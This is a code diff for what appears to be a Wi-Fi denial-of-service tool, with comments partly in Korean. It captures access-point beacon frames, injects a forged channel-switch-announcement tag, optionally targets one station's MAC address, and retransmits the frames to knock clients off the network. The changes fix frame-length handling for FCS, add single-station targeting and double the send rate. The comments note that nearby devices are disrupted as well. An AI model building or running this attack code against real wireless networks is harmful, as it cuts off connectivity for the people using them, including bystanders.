@@ -54,15 +54,15 @@ int main(int argc, char* argv[]) {
     ST_MAC ap_mac = macFromArgv(argv[2]);
 
     bool stationMode = false;
+    ST_MAC st_mac = {0,0,0,0,0,0};
 
     // 타겟해서 때려도 뭔가 주변도 먹통.. Request-to-send 많이 발생.
     if (argc == 4)
     {
         stationMode = true;
+        st_mac = macFromArgv(argv[3]);
         printf("stationMode Activate\n");
     }
-
-    ST_MAC st_mac = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
@@ -97,33 +97,47 @@ int main(int argc, char* argv[]) {
         //printf("beacon frame captured\n");
         int presentCount = isPresentCount(packet);
         uint32_t caplen = header->caplen;
-        bool Fcs = hasFcs(packet, &rdt, presentCount);
+        bool isFcs = hasFcs(packet, &rdt, presentCount);
 
         // phase 2: insert channel switch announcement
         const u_char* beaconTagPacket = (packet + rdt.len + sizeof(ST_WL) + sizeof(ST_BC_COMMON));
-        int tagLen = (header->caplen - rdt.len - sizeof(ST_WL) - sizeof(ST_BC_COMMON));
-        int InsertTagLoc =  header->caplen - tagLen +
-            getInsertTagLoc(beaconTagPacket, tagLen, 37);
+        uint tagLen = (caplen - rdt.len - sizeof(ST_WL) - sizeof(ST_BC_COMMON));
+        uint newPacketLen = caplen + 5;
+        if (isFcs)
+        {
+            tagLen -= 4;
+            newPacketLen -=  4;
+        }
+        uint InsertTagLoc =  caplen - (isFcs ? 4 : 0) - tagLen +
+                             getInsertTagLoc(beaconTagPacket, tagLen, 37);
+        uint remainLen = caplen -  InsertTagLoc;
+        if (isFcs) remainLen -= 4;
 
+        u_char* newPacket = new u_char[newPacketLen];
         // if stationMode on, sa.da = st_mac
         if (stationMode)
         {
-            wl.da = st_mac;
+            memcpy(newPacket, packet, rdt.len+4);
+            memcpy(newPacket+rdt.len+4, st_mac.mac, 6);
+            memcpy(newPacket+rdt.len+10, packet+rdt.len+10, InsertTagLoc-rdt.len-10);
         }
-
-        int newPacketLen = header->caplen + 5;
-        u_char* newPacket = new u_char[newPacketLen];
-        memcpy(newPacket, packet, InsertTagLoc);
+        else
+        {
+            memcpy(newPacket, packet, InsertTagLoc);
+        }
         uint8_t csaTag[5] = {0x25, 0x03, 0x01, 0x0B, 0x03};
         memcpy(newPacket+InsertTagLoc, csaTag, 5);
-        memcpy(newPacket+InsertTagLoc+5, packet+InsertTagLoc, header->caplen-InsertTagLoc);
+        memcpy(newPacket+InsertTagLoc+5, packet+InsertTagLoc, remainLen);
         // header->caplen을 패킷에서 찾는건줄 알았으나, 와이어샤크에서 pcap 파일을 수정 후 열때 문제인 것 같아 pass
+
+
 
         // phase 3: send beacon attack frame
         res = pcap_sendpacket(pcap, newPacket, newPacketLen);
         if(res != 0)
         {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            delete[] newPacket;
             return -1;
         }
 
@@ -135,7 +149,7 @@ int main(int argc, char* argv[]) {
         sendCount ++;
         if (sendCount == 1000) sendCount = 999;
         delete[] newPacket;
-        usleep(400000);
+        usleep(200000);
     }
 
     pcap_close(pcap);
